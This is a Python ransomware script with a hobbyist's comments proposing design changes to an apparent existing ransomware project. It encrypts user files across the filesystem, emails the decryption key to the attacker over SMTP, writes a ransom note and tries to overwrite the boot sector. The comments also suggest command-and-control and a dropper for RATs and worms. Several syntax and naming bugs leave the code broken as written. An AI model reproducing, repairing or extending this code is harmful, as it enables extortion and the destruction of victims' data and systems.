#!/usr/bin/python

#
# Got to looking at the cypher ransomware page and didn't like alot of it
# so I've dropped my own design ideas for it here to see if I can maybe
# be of some use to their project.
#

# --- global import section ---

import os
import sys
import random
import struct
import smtplib
import string
import datetime
import time
# importing psutil to help find drives, caveat: this works best on linux and windows, there may need to be some working for osx according to a quick google.
import psutil

import getpass as gp

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from multiprocessing import Pool


# ---- Define all the global variables section ---

ID = ''
# ^ initializing null variable. shame. haha
key = RSA.generate(4096)
exKey=key.exportKey('PEM')
# Their code currently shows RSA.exportKey, which doesn't work for my tests with python 2.6/2.7 and most of this doesn't port to 3.4

# I'm dropping the boot Sector play into here because there is no reason to make that it's own binary.
# Here I've dropped this to a lowest asm of just declare and drop. No reason to worry about printing, it already prints.
bootBin="""be037c0a0d0a0d"""

# --- Define all the routines section ---
def findOperatingSystem():
# This is to stop the nonsense of trying to do this later.
 systemDetails=sys.platform
 userDetails=gp.getuser()
 userId=os.geteuid()
 if systemDetails == 'linux2' and userDetails == 'root' and userId=0:
  return "linux2-root"
 elif systemDetails == "win32" and  userDetails == 'administrator':
#^ yes yes, this isn't inherently admin privs, I'm gettin' to it. 
  try:
#only place it will be needed, so trying import here
   import win32api
   from win32com.shell import shell
   if shell.IsUserAnAdmin() == True:
    return "win32-admin"
   elif shell.IsUserAnAdmin() == False:
    continue
   else:
    continue
  except:
   pass
# ^ yes, that was a lame way to test
 elif systemDetails == 'linux2':
  return "linux2"
 elif systemDetails == 'win32':
  return "win32"
 else:
  return "Other"

def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
	global ID
	ID = ''.join(random.choice(chars) for _ in range(size))


def tryToWriteBootSeckt(ransom, os):
#obviously theres a few ways to restructure this, but maybe something like:
 try:
  if os == 'linux2-root':
   disk=open(psutil.disk_partitions()[0][0], 'wb')
   count=0
   for o in [ransom[i:i+2] for i in range(0, len(ransom), 2)]:
    if count <= 512:
# yes, this is decoding when writing. thats sorta slow but whateva
     disk.write(str(i).decode('hex'))
     count+=1
    else:
     pass
  elif os == 'win32-admin':
   disk=open(psutil.disk_partitions()[0][0], 'wb')
   count=0
   for o in [ransom[i:i+2] for i in range(0, len(ransom), 2)]:
    if count <= 512:
     disk.write(str(i).decode('hex'))
     count+=1
    else:
     pass
  else:
   pass
 except:
  pass


# This isn't really a C2 method per se, and is WAAAY too resource intensive on the front of having to build every attack.
# Why do this to people? Why not support them with a port or web architecture? Or maybe make that an optional generation into this?
# With that rant aside, might want to generate more possibilities, or drop an email signup generation bot or something, then you'd just have to send it back to your email.
# Rather than hard coding it. Too much shit will get blocked.
# Alternative: you can use python to send emails directly, but you might as well do web c2 at that point.
# People seem to think you'd need to setup a server but you can just make a packet handler.
# I noticed you weren't going for any C2 in the sense of stealing their data here either. So really, your C2 as your readme called it, is just a table for generating the private keys,
# which can then be shifted as needed. Might be able to hype that as more of a featured control, which I currently see no method of controlling (maybe you still need server side?)
# more than as C2 in the control sense. Its not really command or control, and it's not double client chains either.
# Can we make this as a sub-feature and expand this to being that email generation, a collection script, and a server(web server drop maybe?) that can do the collections for us?
# Maybe even add in a dropper lookup so it attempts to pull rats, worms, whatever else we want down?
# Since this is designed as ransomware and not rats that may not be needed, but figured I'd mention that as it stands, you'd acheive little with this script if anything without expansion
# and a generator to build this script for you would be very tedious just to get it to work. Limiting practical application of this as ransomware, or really anything even malicious from this code.

def send_ID_Key():
	ts = datetime.datetime.now()
	SERVER = "smtp.gmail.com" 		
	PORT = 587 						
	USER= "address@gmail.com"		# Specify Username Here 
	PASS= "prettyflypassword"	    # Specify Password Here
	FROM = USER
	TO = ["address@gmail.com"] 		
	SUBJECT = "Ransomware data: "+str(ts)
	MESSAGE = """\Client ID: %s Decryption Key: %s """ % (ID, exKey)
	message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
	try:              
		server = smtplib.SMTP()
		server.connect(SERVER, PORT)
		server.starttls()
		server.login(USER, PASS)
		server.sendmail(FROM, TO, message)
		server.quit()
	except Exception as e:
		# print e
		pass

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.crypt'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def single_arg_encrypt_file(in_filename):
    encrypt_file(key, in_filename)

def select_files():
    
    ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe", 
           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
           ".mov", ".gif", ".txt", ".py", ".pyc", ".jar"]
           
    files_to_enc = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(tuple(ext)):
                files_to_enc.push(os.path.join(root, file))

    # Parallelize execution of encryption function over four subprocesses
    # not sure if you'd rather make this function be more relatable to their available cpu with a limit of "at least 4 threads" might be a little extra work to identify that then scale to it, but whatever. 
    pool = Pool(processes=4)
    pool.map(single_arg_encrypt_file, files_to_enc)

def note(OS):
# This can be dropped in place by a generator by doing a string replacement:
	readme = """Aol Jfwoly Wyvqlja"""

	if 'linux2' in OS:
	 outdir = os.getenv('HOME') + "/Desktop/"
	elif 'win32' in OS:
	 outdir=os.getenv('USERPROFILE')+"\\Desktop\\"
	else:
# gonna default this back to linux
	 outdir = os.getenv('HOME') + "/Desktop/"
	outfile=outdir + "README.TXT"
	handler = open(outfile, 'w')
	handler.write(outfile, ID)
	handler.close()
# Gonna reuse the same ransom message regardless of placement or size. TLDR: if it breaks shit, the know you're super serious. haha
	return readme


def main():
# callin' it so we don't keep callin' it
 RunningOs=findOperatingSystem()
 gen_client_ID()
 send_ID_Key()
 select_files()
 ransomMessage=note()
 ransomBin=bootbin+str(ransomMessage).encode('hex')
 if len(ransomBin) <= 512:
  amountNeeded=512-len(ransomBin)
  ransomBin=ransomBin+("00"*amountNeeded)
 try:
# this try is sorta redundant, whatever.
# Also, question? Do we want them to recover the bootsekt? If so, we can collect the size for it first then pull that into a seperate file also encrypted.
# Making it a special designation for those who do get their boot sector blown away, the chance to recover it / the file table / whatever else is blown away by dumping this.
# Because why not. 
  tryToWriteBootSekt(ransomBin, RunningOs)
 except:
# Why make noise if not needed? 
  pass
 


if __name__ == '__main__':
 main()
